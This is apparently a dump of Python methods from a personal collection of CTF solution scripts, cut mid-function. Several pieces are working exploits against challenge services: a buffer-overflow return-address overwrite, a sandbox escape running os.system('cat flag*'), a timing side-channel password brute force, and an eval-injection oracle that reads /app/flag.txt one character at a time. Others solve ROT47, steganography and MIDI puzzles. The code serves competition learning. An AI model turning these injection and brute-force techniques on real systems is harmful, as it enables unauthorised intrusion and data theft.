        ) - self.get_elf_function_address(function2)
        return offset

	# /home/figaro/CTF/Categories/Pwn/ECSC/Log_Recorder/payloads/attempt_01.py
    def main(self):
        self.initiate_connection()
        self.elf = None
        # main_offset = self.challenge_get_offset_address("main", "emergency_broadcast")
        emergency_broadcast_addr = self.get_elf_function_address("emergency_broadcast")
        payload1 = b"A" * 24
        # + b"\x91"
        print(payload1)
        payload2 = b"B" * 24 + self.pwn.p64(emergency_broadcast_addr)
        print(payload2)
        self.recv_lines(2)
        log_entry_text = "Enter log entry: "
        self.recv_until(log_entry_text)
        self.send(payload1)
        data_entry_text = "Enter data: "
        self.recv_until(data_entry_text)
        self.send(payload2)
        self.conn.interactive()

	# /home/figaro/CTF/Categories/Miscellaneous/Reply/Flagsembler/payloads/solution.py
    def main(self):
        pass

	# /home/figaro/CTF/Categories/Miscellaneous/plaidctf/Hangman/payloads/solution.py
    def main(self):
        pass

	# /home/figaro/CTF/Categories/Miscellaneous/CSCG/It-Admin/payloads/solution.py
    def rot_bruteforce(self, crypted_text, known_text, max_shift=94):
        """
        Brute forces ROT47 shifts to find the one that contains the known text.

        Args:
            crypted_text (str): The encrypted text.
            known_text (str): The known plaintext to look for.
            max_shift (int): The maximum shift to attempt (ROT47 has 94 shifts).

        Returns:
            int: The shift that contains the known text, or -1 if not found.
        """
        for shift in range(1, max_shift):
            decrypted_text = self.rot(crypted_text, shift)
            if known_text.lower() in decrypted_text.lower():
                return shift
        return -1

	# /home/figaro/CTF/Categories/Miscellaneous/CSCG/It-Admin/payloads/solution.py
    def rot(self, text, shift):
        """
        Applies the ROT47 cipher to the given text with the specified shift.

        Args:
            text (str): The input text.
            shift (int): The ROT47 shift amount.

        Returns:
            str: The transformed text.
        """
        return "".join([self.rot_char(c, shift) for c in text])

	# /home/figaro/CTF/Categories/Miscellaneous/CSCG/It-Admin/payloads/solution.py
    def rot_char(self, c, shift):
        """
        Rotates a single character using the ROT47 cipher.

        Args:
            c (str): The input character.
            shift (int): The ROT47 shift amount.

        Returns:
            str: The rotated character.
        """
        ascii_code = ord(c)
        if 33 <= ascii_code <= 126:  # ROT47 only affects printable ASCII
            return chr((ascii_code - 33 + shift) % 94 + 33)
        return c

	# /home/figaro/CTF/Categories/Miscellaneous/CSCG/It-Admin/payloads/solution.py
    def main(self):
        hexing = "6a0077002d0032002c0054003d006400420071004e004700250053002800680064004f007800490046002000780044004c00710058002600530038006e004f003b004c0022002400670064002100500060005d0055003d006c0027003000290069002e004d002500660071004c005400710077006e0037005600330031003a003e006d004d0033006d0070006c003c005600500034003b0045003d003d007a0071005f004c0067006d004a005b0049002e00410056002b0076003d0060007a004b002c005b007a005f002000380039005e006d00230074005e002200680040002d006e0079002e00370066002e005300"
        result = ""
        for i in range(0, len(hexing), 2):
            # print(hexing[i : i + 2])
            if hexing[i : i + 2] == "00":
                result += " "
            else:
                result += hexing[i : i + 2]
        print(result)

        decoded = bytes.fromhex(hexing).decode("utf-16")
        print(decoded)
        partial = "}"
        shift = self.rot_bruteforce(decoded, partial)
        print(f"Shift: {shift}")
        print(f"Decoded: {self.rot(decoded, shift)}")

	# /home/figaro/CTF/Categories/Miscellaneous/NTUA/Challenge_Idea/payloads/solution.py
    def main(self):
        selections = [
            "3_0",
            "1_2",
            "3_2",
            "1_1",
            "5_0",
            "0_0",
            "2_0",
            "1_0",
            "3_1",
            "5_2",
            "5_1",
            "6_0",
            "6_1",
            "3_3",
            "2_1",
            "2_2",
            "0_1",
        ]
        seldir = {
            0: {0: 123, 1: 125},
            1: {0: 80, 1: 67, 2: 72},
            2: {0: 80, 1: 101, 2: 82},
            3: {0: 78, 1: 84, 2: 52, 3: 84},
            5: {0: 75, 1: 109, 2: 88},
            6: {0: 52, 1: 53},
        }

        flag = ""
        for s in selections:
            nums = [int(i) for i in s.split("_")]
            flag += chr(seldir[nums[0]][nums[1]])
        print(flag)

	# /home/figaro/CTF/Categories/Miscellaneous/NTUA/Challenge_Idea/payloads/solution.py
    def verify_js_reconstructed(self):
        self.challenge_file = self.Path(self.folder_data, "chall_edited.pptx")
        self.try_catch(self.run)

	# /home/figaro/CTF/Categories/Miscellaneous/NTUA/Challenge_Idea/payloads/verify.py
    def main(self):
        self.challenge_file = self.Path(self.folder_data, "chall_edited.pptx")
        self.try_catch(self.run)

	# /home/figaro/CTF/Categories/Miscellaneous/NTUA/Challenge_Idea/payloads/verify.py
    def run(self):
        selections = [
            "3_0",
            "1_2",
            "3_2",
            "1_1",
            "5_0",
            "0_0",
            "2_0",
            "1_0",
            "3_1",
            "5_2",
            "5_1",
            "6_0",
            "6_1",
            "3_3",
            "2_1",
            "2_2",
            "0_1",
        ]

        prs = Presentation(self.challenge_file)
        correct = True

        for selection in selections:
            slide_index = int(selection[0])
            shape_index = 1 if selection[0] != "0" else 0
            text_index = int(selection[2])

            slide = prs.slides[slide_index]
            shape = slide.shapes[shape_index]
            text = shape.text

            if slide_index == 0:
                if text_index == 0 and text[0] != chr(123):
                    correct = False
                elif text_index == 1 and text[23] != chr(125):
                    correct = False
            elif slide_index == 1:
                if text_index == 0 and text[41] != chr(80):
                    correct = False
                elif text_index == 1 and text[138] != chr(67):
                    correct = False
                elif text_index == 2 and text[184] != chr(72):
                    correct = False
            elif slide_index == 2:
                if text_index == 0 and text[0] != chr(80):
                    correct = False
                elif text_index == 1 and text[83] != chr(101):
                    correct = False
                elif text_index == 2 and text[179] != chr(82):
                    correct = False
            elif slide_index == 3:
                if text_index == 0 and text[25] != chr(78):
                    correct = False
                elif text_index == 1 and text[26] != chr(84):
                    correct = False
                elif text_index == 2 and text[28] != chr(52):
                    correct = False
                elif text_index == 3 and text[84] != chr(84):
                    correct = False
            elif slide_index == 5:
                if text_index == 0 and text[105] != chr(75):
                    correct = False
                elif text_index == 1 and text[106] != chr(109):
                    correct = False
                elif text_index == 2 and text[219] != chr(88):
                    correct = False
            elif slide_index == 6:
                if text_index == 0 and text[52] != chr(52):
                    correct = False
                elif text_index == 1 and text[95] != chr(53):
                    correct = False

        if correct:
            print("Thanx for helping me out, now go input the flag")
        else:
            print("I don't think i had that in mind")

	# /home/figaro/CTF/Categories/Miscellaneous/NTUA/Challenge_Idea/payloads/verify.py
    def try_catch(self, callback):
        try:
            callback()
        except Exception as error:
            print(error)

	# /home/figaro/CTF/Categories/Miscellaneous/NTUA/Snekbox/payloads/solution.py
    def main(self):
        self.challenge_file = self.folfil("data", "edited_server.py")
        self.initiate_connection()
        self.menu_text = "> "
        self.menu_num = 0

        payload = 'globals().get("unsafe" + globals()["BLACKLIST"][6] + globals()["BLACKLIST"][9])()'
        self.send_menu(choice=payload)

        payload = """__import__('os').system("cat flag*")"""
        # payload = """print("THis is working " )"""
        self.send_menu(choice=payload)
        self.recv_lines(number=1, display=True)

	# /home/figaro/CTF/Categories/Miscellaneous/NTUA/NaKopsoGlyko/payloads/solution.py
    def main(self):
        # self.initiate_connection()
        # self.exploitation()
        self.flouri_min = self.random_flouri_generator(number=1)
        self.flouri_max = self.random_flouri_generator(number=10**30)

        # self.recv_menu(number=2, save=True)
        # self.send_menu()

        self.brute_force()

	# /home/figaro/CTF/Categories/Miscellaneous/NTUA/NaKopsoGlyko/payloads/solution.py
    def test_letter(self, password):
        alphabet = string.ascii_letters + string.digits + string.punctuation

        results = []

        for i in alphabet:
            connector = CTFSolver(
                conn=self.conn_type, file=self.file, url=self.url, port=self.port
            )

            connector.menu_text = "Give me password and number in json: "
            connector.menu_num = 0

            connector.initiate_connection()
            connector.recv_lines(number=2, display=False)
            start_time = time.time()
            connector.send_menu(
                self.payload_maker(password + i, self.flouri_min), display=False
            )
            response = connector.recv_lines(number=1, save=True)

            connector.conn.close()

            end_time = time.time()

            results.append((i, end_time - start_time))

        results = sorted(results, key=lambda x: x[1])

        return results

	# /home/figaro/CTF/Categories/Miscellaneous/NTUA/NaKopsoGlyko/payloads/solution.py
    def brute_force(self):
        password = ""
        for _ in range(60):
            results = self.test_letter(password)
            print(results)
            password += results[0][0]
            print(password)

	# /home/figaro/CTF/Categories/Miscellaneous/NTUA/NaKopsoGlyko/payloads/solution.py
    def random_flouri_generator(self, number=None):
        m = 10**30

        if number:
            return (
                number**11
                + 17 * number**7
                - 42 * number**5
                + 1337 * number * 3
                + 31337 * number
            )

        return (
            random.randint(1, m) ** 11
            + 17 * random.randint(1, m) ** 7
            - 42 * random.randint(1, m) ** 5
            + 1337 * random.randint(1, m) * 3
            + 31337 * random.randint(1, m)
        )

	# /home/figaro/CTF/Categories/Miscellaneous/NTUA/NaKopsoGlyko/payloads/solution.py
    def check_password_time(self, length):
        start_time = time.time()
        for i in range(length):
            for _ in range(10000):
                pass
            return time.time() - start_time
        return time.time() - start_time

	# /home/figaro/CTF/Categories/Miscellaneous/NTUA/NaKopsoGlyko/payloads/solution.py
    def exploitation(self):
        self.recv_lines(number=2)

        self.menu_text = "Give me password and number in json: "

        self.menu_num = 1

	# /home/figaro/CTF/Categories/Miscellaneous/NTUA/NaKopsoGlyko/payloads/solution.py
    def length_find(self):

        lenghter = CTFSolver(
            conn=self.conn_type, file=self.file, url=self.url, port=self.port
        )
        for i in range(10, 130):
            time_reference = self.check_password_time(i)

            print(time_reference)

            lenghter.initiate_connection()
            lenghter.recv_lines(number=2)
            lenghter.menu_num = 0
            menu_text = "Give me password and number in json: "
            payload = self.payload_maker("NH4CK{" + "a" * i, self.flouri_min + i)

            start_time = time.time()
            # lenghter.recv_lines(number=2, display=True)
            lenghter.send_menu(payload, menu_text=menu_text, display=True)

            print("Trying length: ", i)
            response = lenghter.recv_lines(number=1, display=True, save=True)
            stop_time = time.time()

            duration = stop_time - start_time

            if b"GLYKO and HUGS" in response[0]:
                print("length found", i)
                print(response[0])
                # return i

            if b"sweet AND lucky" in response[0]:
                print("Found the correct length")
                print("Duration: ", duration)
                print("Response: ", response[0])
                print("Payload: ", payload)
                print("Flouri: ", self.flouri_min + i)
                sys.exit(0)
                return i

            if b"Something wrong honey?" in response[0]:
                return i

            print(f"Duration: {duration}")
            print(f"Time Reference: {time_reference}")
            if duration > time_reference:
                print("Length found: ", i)
                return i

	# /home/figaro/CTF/Categories/Miscellaneous/NTUA/NaKopsoGlyko/payloads/solution.py
    def payload_maker(self, password, number):
        payload = {"password": password, "number": number}
        return json.dumps(payload)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/CalculAltor/payloads/solution.py
    def main(self):
        self.real_url = f"http://{self.url}:{self.port}"
        self.url_path = f"{self.real_url}/calculate"
        # self.sending_request()
        self.preparing_dictionary()
        self.get_flag_length()
        self.flag = "ECSC{"
        self.bruteforcer()

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/CalculAltor/payloads/solution.py
    def sending_request(self, exploit=None, verbose=False):

        # payload = "```python\nwith open('/app/flag.txt') as f:\n result = f.read()\nprint(result)\n```"

        headers = {
            "Content-Type": "application/json",
            "Origin": self.real_url,
            "Referer": f"{self.real_url}/",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64)",
            "Accept": "*/*",
        }
        payload = {"equation": exploit}

        response = requests.post(self.url_path, headers=headers, json=payload)
        if verbose:
            print("[+] Status:", response.status_code)
            print("[+] Response:", response.text)
            print(response.json())
        return response.json()

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/CalculAltor/payloads/solution.py
    def get_flag_length(self):
        exploit = "0+len(open('/app/flag.txt').read())"
        response = self.sending_request(exploit=exploit, verbose=False)
        if response and "result" in response:
            try:
                self.flag_length = int(response["result"])
                print(f"[+] Flag length: {self.flag_length}")
            except ValueError:
                print("[-] Failed to parse flag length.")
        else:
            print("[-] No valid response received.")

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/CalculAltor/payloads/solution.py
    def exploit_development(self, i, letter):
        # variable = "+".join([ord(l) * 1000 * i for i, l in enumerate("ECSC{TEST}")])
        # print(variable)
        exploit = f"0+(1 if open('/app/flag.txt').read()[{i}]=='{letter}' else 0)"
        return exploit

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/CalculAltor/payloads/solution.py
    def preparing_dictionary(self):
        """
        This method is not used in the current solution.
        It can be implemented if needed for future enhancements.
        """
        additional = {
            "e": 3,
            "a": 4,
            "i": 1,
            "o": 0,
            "s": 5,
            "t": 7,
            "g": 9,
        }
        self.dictionary = "_-{}"
        for i in range(len(ascii_uppercase)):
            if ascii_lowercase[i] in additional:
                self.dictionary += str(additional[ascii_lowercase[i]])
            self.dictionary += ascii_uppercase[i] + ascii_lowercase[i]
        self.dictionary += digits + punctuation

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/CalculAltor/payloads/solution.py
    def bruteforcer(self):
        for i in range(len(self.flag), self.flag_length):
            for letter in self.dictionary:
                exploit = self.exploit_development(i, letter)
                # print(f"[+] Trying: {exploit}")
                response = self.sending_request(exploit=exploit)
                if response and "result" in response:
                    try:
                        result = int(response["result"])
                        if result == 1:
                            print(
                                f"[+] Found character at position {i}: {letter}. Flag so far: {self.flag + letter}"
                            )
                            self.flag += letter
                            break
                        else:
                            print(f"[-] Character at position {i} is not: {letter}")
                    except ValueError:
                        print("[-] Failed to parse response.")
                else:
                    print("[-] No valid response received.")

        print(f"[+] Final flag: {self.flag}")

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/CalculAltor/payloads/solution.py
    def validate_flag(self):
        for i, letter in enumerate(self.flag):
            exploit = self.exploit_development(i, letter)
            print(f"[+] Trying: {letter}")
            response = self.sending_request(exploit=exploit)
            if response and "result" in response:
                try:
                    result = int(response["result"])
                    if result == 0:
                        print(f"[-] Flag is invalid at position {i}: {letter}")
                        return False
                except ValueError:
                    print("[-] Failed to parse response.")
                    return False
            else:
                print("[-] No valid response received.")
                return False
        print("[+] Flag is valid!")

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/InitialChallenge/payloads/solution.py
    def main(self):
        image = self.folfil("files", "qo91ni.jpg")
        img = Image.open(image)
        r, g, b = img.split()
        r_lsb = np.array(r) & 1
        g_lsb = np.array(g) & 1
        b_lsb = np.array(b) & 1
        combined = (r_lsb << 2) | (g_lsb << 1) | b_lsb
        Image.fromarray((combined * 32).astype(np.uint8)).show()

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/music21_solution.py
    def bruteforcing_failed(self):
        self.KEY = [
            7,
            58,
            391,
            58,
            129,
            80,
            537,
            80,
            389,
            33,
            80,
            107,
            522,
            391,
            389,
            148,
            386,
            522,
            389,
            58,
            240,
            240,
            107,
            1,
        ]
        flag = []
        all_letters = ascii_letters + punctuation
        for i in self.KEY:
            # flag += chr(self.KEY[i] ^ ord(variables[i % len(variables)]))
            flag.append(all_letters[(i) % len(all_letters)])
        self.flag = "".join(flag)
        print(self.flag)
        # print(ascii_letters)
        print(all_letters)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/music21_solution.py
    def main(self):

        # self.bruteforcing_failed()
        # return
        self.music21_analysis()

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/music21_solution.py
    def music21_analysis(self):
        # midi_file_path = "/mnt/data/flag.midi"
        self.midi = converter.parse(self.challenge_file)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/music21_solution.py
    def music21_note_analysis(self):
        # Analyze structure and extract textual representation
        notes_data = []
        for element in self.midi.flatten():
            # print(element)
            notes_data.append(str(element))
            # if isinstance(element, note.Note):
            #     notes_data.append(str(element.pitch))
            # elif isinstance(element, chord.Chord):
            #     notes_data.append(".".join(str(n) for n in element.normalOrder))

        return

        analysis = []

        for i, element in enumerate(notes_data):
            split_element = element.split(" ")
            if "." in split_element[0]:
                analysis.append(
                    {
                        "sort": i,
                        "type": split_element[0].split(".")[1],
                        "value": " ".join(split_element[1:]),
                    }
                )
            else:
                analysis.append({"sort": i, "type": "generic", "value": element})

        with open(self.folfil("data", "analysis_music_21.json"), "w") as f:
            import json

            json.dump(analysis, f, indent=4)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/solution.py
    def get_functions(self, variable, under=False):
        """
        Get all functions of a variable
        """

        return [
            func
            for func in dir(variable)
            if callable(getattr(variable, func))
            and (under or not (func.startswith("__")))
        ]

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/solution.py
    def get_attributes(self, variable):
        """
        Get all attributes of a variable
        """

        return [
            attr
            for attr in dir(variable)
            if not callable(getattr(variable, attr)) and not (attr.startswith("__"))
        ]

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/solution.py
    def get_instruments(self):
        """
        Returns a list of instruments in the MIDI file.
        """

        for instrument in self.midi_data.instruments:
            print(instrument)
        return self.midi_data.instruments

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/solution.py
    def init_some_values(self):
        self.key = [
            7,
            58,
            391,
            58,
            129,
            80,
            537,
            80,
            389,
            33,
            80,
            107,
            522,
            391,
            389,
            148,
            386,
            522,
            389,
            58,
            240,
            240,
            107,
            1,
        ]

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/solution.py
    def main(self):
        self.init_some_values()
        self.midi_data = pretty_midi.PrettyMIDI(self.challenge_file.as_posix())
        instruments = self.midi_data.instruments

        piano = instruments[1]
        notes = [note.pitch for note in piano.notes]

        chosen = [notes[c] for c in self.key]

        flag = "".join([chr(c) for c in chosen])

        flag = flag[:4] + "{" + flag[4:] + "}"
        print("Flag:", flag)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/position_cipher_functions.py
    def load_lyrics(self):

        files = [
            "lyrics_partial.txt",
            "lyrics.txt",
            "greek_lyrics.txt",
            "genius_lyrics.txt",
        ]

        with open(self.folfil("data", files[1]), "r") as f:
            lyrics = f.read().strip()
        return lyrics

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/position_cipher_functions.py
    def dictionary_analysis(self, lyrics):
        d = defaultdict(list)
        for i, c in enumerate(lyrics):
            d[c].append(i)
        return d

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/position_cipher_functions.py
    def print_dictionary(self, d):
        sorted_items = sorted(d.items(), key=lambda x: x[0])
        for key, value in sorted_items:
            print(f"{key}: {value}")

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/position_cipher_functions.py
    def lyric_transpose(self, lyrics, offset, wrap=True):
        if offset > len(lyrics):
            offset = offset % len(lyrics)

        result = lyrics[offset:]
        if wrap:
            result += lyrics[:offset]

        return result

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/position_cipher_functions.py
    def lyric_transformation(self, lyrics):

        punctuation_used = set()
        for c in lyrics:
            if c not in ascii_letters + digits + " ":
                punctuation_used.add(c)

        lyrics_only_letters = "".join([c for c in lyrics if c.isalnum()])
        lyrics_with_spaces = lyrics.replace("\n", " ")
        lyrics_without_punctuation = lyrics_with_spaces.replace("'", "").replace(
            ",", ""
        )
        return lyrics_only_letters, lyrics_with_spaces, lyrics_without_punctuation

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/position_cipher_functions.py
    def lyrics_all(self):
        """
        Description:
            This function generates all possible combinations of lyrics transformations
            based on the provided replace_combos and control_combos.
            It uses itertools.product to create combinations of the specified number
            of transformations, allowing for flexible lyric manipulation.
        Returns:
            list: A list of transformed lyrics combinations.
        """
        lyrics = self.load_lyrics()
        control_combos = self.creating_control_combos(
            start=0, end=1, number=len(self.replace_combos)
        )
        return [
            self.lyrics_transformation(lyrics, self.replace_combos, control)
            for control in control_combos
        ]

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/position_cipher_functions.py
    def creating_control_combos(self, start=0, end=1, number=8):
        if start >= end:
            raise ValueError("Start must be less than end.")
        if number < 1:
            raise ValueError("Number of combinations must be at least 1.")
        return list(itertools.product(range(start, end + 1), repeat=number))

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/position_cipher_functions.py
    def lyrics_transformation(self, lyrics, replace_combos, control_combos=None):
        if control_combos is None:
            return lyrics

        for control, combo in zip(control_combos, replace_combos):
            if control:
                if len(combo[0]) > 1:
                    lyrics = lyrics.replace(*combo[0]).replace(*combo[1])
                else:
                    lyrics = lyrics.replace(*combo)
        return lyrics

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/position_cipher_functions.py
    def brute_transpose_find_flag(
        self,
        lyrics: str,
        partial_flag: str,
        keys: list,
        verbose: bool = False,
        wrap: bool = True,
    ):
        """
        Description:
            For the lyrics given

        Args:
            lyrics (str): Lyrics given
            partial_flag (str): partial flag to look
            verbose (bool, optional): _description_. Defaults to False.

        Returns:
            str: possible flag
        """

        for i in range(len(lyrics)):
            transposed = self.lyric_transpose(lyrics, i, wrap=wrap)
            if verbose and i % 100 == 0:
                print(f"Trying offset: {i}")
            temp_flag = self.position_cipher(transposed, keys)
            if "ecsc" in temp_flag.lower() or self.check_for_rot(
                temp_flag, partial_flag
            ):
                print(f"Found flag: {temp_flag} - Offset: {i}")
                return temp_flag

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/position_cipher_functions.py
    def check_for_rot(self, text, partial="ecsc"):
        """
        Description:
            Checks if the text is a rotation of "ecsc".
            This function checks if the first four characters of the text
            can be rearranged to form the string "ecsc". It does this by
            comparing the ASCII values of the characters in the text with
            the ASCII values of the characters in "ecsc". If the conditions
            are met, it returns True, indicating that the text is a rotation
            of "ecsc". Otherwise, it returns False.
            This function is useful for identifying specific patterns in the text
            that match the structure of "ecsc", which could be relevant in certain

            Challenge_specific
        Args:
            text (_type_): _description_

        Returns:
            _type_: _description_
        """

        if len(partial) != 4:
            raise ValueError(
                "Partial must be exactly 4 characters long. Challenge_specific"
            )
        text = text.lower()

        check1 = (ord(partial[0]) - ord(partial[1])) == (ord(text[0]) - ord(text[1]))
        check2 = (ord(partial[2]) - ord(partial[1])) == (ord(text[2]) - ord(text[1]))
        check3 = ord(text[3]) == ord(text[1])

        return check1 and check2 and check3

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/position_cipher_functions.py
    def position_cipher(self, text: str, keys: list):
        """
        Description:
            This function takes a text and a list of keys, and returns a new string
            where each character in the text is replaced by the character at the
            corresponding index in the keys list. If the index exceeds the length of
            the text, it wraps around using modulo operation.
        Args:
            text (str): The input text to be transformed.
            keys (list): A list of integers representing the positions in the text.
        Returns:
            str: A new string formed by replacing characters in the text based on the keys.
        """

        return "".join(text[i % len(text)] for i in keys)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/position_cipher_functions.py
    def bruteforce_all_lyrics(
        self,
        all_lyrics: list,
        partial_flag: str,
        keys: list,
        verbose: bool = False,
        wrap: bool = True,
    ):
        results = []
        for lyric_i, lyrics in enumerate(all_lyrics):
            if verbose:
                print(f"Processing lyrics {lyric_i + 1}/{len(all_lyrics)}")
            result = self.brute_transpose_find_flag(
                lyrics=lyrics,
                partial_flag=partial_flag,
                keys=keys,
                verbose=verbose,
                wrap=wrap,
            )
            if result:
                results.append([lyric_i, result])

        return results

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/position_cipher_functions.py
    def init_some_values(self):
        self.key = [
            7,
            58,
            391,
            58,
            129,
            80,
            537,
            80,
            389,
            33,
            80,
            107,
            522,
            391,
            389,
            148,
            386,
            522,
            389,
            58,
            240,
            240,
            107,
            1,
        ]

        self.replace_combos = [
            (" ", ""),
            (",", " "),
            ((",", " "), ("'", " ")),
            ((",", ""), ("'", "")),
            (",", ""),
            ("'", " "),
            ("'", ""),
            ("\n", " "),
            ("\n", ""),
        ]

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/position_cipher_functions.py
    def another_attempt(self):

        lyrics = self.load_lyrics()

        lyrics_only_letters, lyrics_with_spaces, lyrics_without_punctuation = (
            self.lyric_transformation(lyrics)
        )

        print(lyrics_only_letters)
        print(lyrics_with_spaces)
        print(lyrics_without_punctuation)

        # flag = self.bruteforce(lyrics, self.key)
        # print(flag)
        # flag = self.bruteforce(lyrics_only_letters, self.key)
        # print(flag)
        flag = self.brute_transpose_find_flag(lyrics_with_spaces, self.key)
        print(flag)
        flag = self.brute_transpose_find_flag(lyrics_without_punctuation, self.key)
        print(flag)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/position_cipher_functions.py
    def main(self):

        self.init_some_values()

        all_lyrics = self.lyrics_all()

        partial_flag = "ecsc"

        results = self.bruteforce_all_lyrics(
            all_lyrics, partial_flag, keys=self.key, verbose=True, wrap=True
        )
        if results:
            for lyric_i, result in results:
                print(f"Lyric {lyric_i + 1}: {result}")
        else:
            print("No results found.")

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/attempt_01.py
    def bruteforcing_failed(self):

        flag = ""
        for i in range(len(self.KEY)):
            # flag += chr(self.KEY[i] ^ ord(variables[i % len(variables)]))
            flag += ascii_letters[(self.KEY[i]) % len(ascii_letters)]
        self.flag = flag

        print(self.flag)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/attempt_01.py
    def main(self):

        # variables = "MThdMTrk"
        # variables = "MTrk"

        self.KEY = [
            7,
            58,
            391,
            58,
            129,
            80,
            537,
            80,
            389,
            33,
            80,
            107,
            522,
            391,
            389,
            148,
            386,
            522,
            389,
            58,
            240,
            240,
            107,
            1,
        ]
        self.music21_analysis()

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/attempt_01.py
    def music21_analysis(self):
        # midi_file_path = "/mnt/data/flag.midi"
        midi = converter.parse(self.challenge_file)

        # Analyze structure and extract textual representation
        notes_data = []
        for element in midi.flatten():
            # print(element)
            notes_data.append(str(element))
            # if isinstance(element, note.Note):
            #     notes_data.append(str(element.pitch))
            # elif isinstance(element, chord.Chord):
            #     notes_data.append(".".join(str(n) for n in element.normalOrder))

        # Show first 50 note/chord representations
        with open(self.folfil("data", "analysis_music_21.json"), "w") as f:
            import json

            json.dump(notes_data, f, indent=4)
        print(notes_data)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/High-Low/payloads/solution.py
    def recv_send(
        self,
        text,
        lines=None,
        text_until=None,
        display=False,
        save=False,
        ansi_escape=False,
    ):
        """
        Description:
            Receives lines and sends a response.
            It can receive a number or lines, and/or specific text.
            If save is True, it saves the output of the menu in a list and returns it.
            If display is True, it prints the output of everything received.

        Args:
            choice (int or str): Choice to send to the menu
            menu_num (int, optional): Number of options printed in the menu. Defaults to None.
            menu_text (str, optional): Text that the menu asks before sending your choice. Defaults to None.
            display (bool, optional): Variable to print every received line. Defaults to False.
            save (bool, optional): . Defaults to False.
        Returns:
            list: List of output of the menu if save is True
        """
        if save:
            result = []

        if lines is None:
            lines = 0

        out_lines = self.recv_lines(number=lines, display=display, save=save)

        if save:
            result.extend(out_lines)

        if text_until:
            out_text_until = self.recv_until(text=text_until, ansi_escape=ansi_escape)

        if ansi_escape:
            out_text_until = self.extract_printable_with_spaces(
                out_text_until.decode("utf-8")
            )

        if save:
            result.append(out_text_until)

        if display:
            print(out_text_until)

        self.send(text)

        if save:
            return result

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/High-Low/payloads/solution.py
    def recv_until(self, text, **kwargs) -> bytes:
        """
        Description:
            Receive data until one of `delims`(text) provided is encountered. It encodes the text before sending it.
            Wrapper for self.conn.recvuntil(text.encode())
            Can also drop the ending if drop is True. If the request is not satisfied before ``timeout`` seconds pass, all data is buffered and an empty string (``''``) is returned.
        Args:
            text (str): Text to receive until
            **kwargs: Additional keyword arguments to pass to the recv
                - drop (bool, optional): Drop the ending.  If :const:`True` it is removed from the end of the return value. Defaults to False.
                - timeout (int, optional): Timeout in seconds. Defaults to default.

        Raises:
            exceptions.EOFError: The connection closed before the request could be satisfied

        Returns:
            A string containing bytes received from the socket,
            or ``''`` if a timeout occurred while waiting.

        """

        # Handles the connection closed before the request could be satisfied
        if kwargs.get("ansi_escape", False):
            text = self.simulate_ansi_typing(text, escape_codes=False)
        kwargs = {k: v for k, v in kwargs.items() if k not in ["ansi_escape"]}
        try:
            return self.conn.recvuntil(text.encode(), **kwargs)
        except EOFError:
            print("Connection closed before the request could be satisfied")
            return b""

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/High-Low/payloads/solution.py
    def get_welcome_message(self):
        self.recv_lines(2)
        time.sleep(0.5)
        self.recv_lines(4)
        time.sleep(0.5)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/High-Low/payloads/solution.py
    def extract_printable_with_spaces(self, text):
        # Remove ANSI escape sequences (e.g., \x1b[?25l, \x1b[?25h, \x1b[K, \x1b[1C, etc.)
        # ansi_escape = re.compile(r"\x1b\[[0-9;?]*[A-Za-z]")
        # ansi_escape = re.compile(r"\x1b\[[0-9;?]*[A-Za-z]")
        ansi_escape = re.compile(r"\x1b\[.*?[@-~]")
        cleaned = ansi_escape.sub("", text)

        return cleaned

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/High-Low/payloads/solution.py
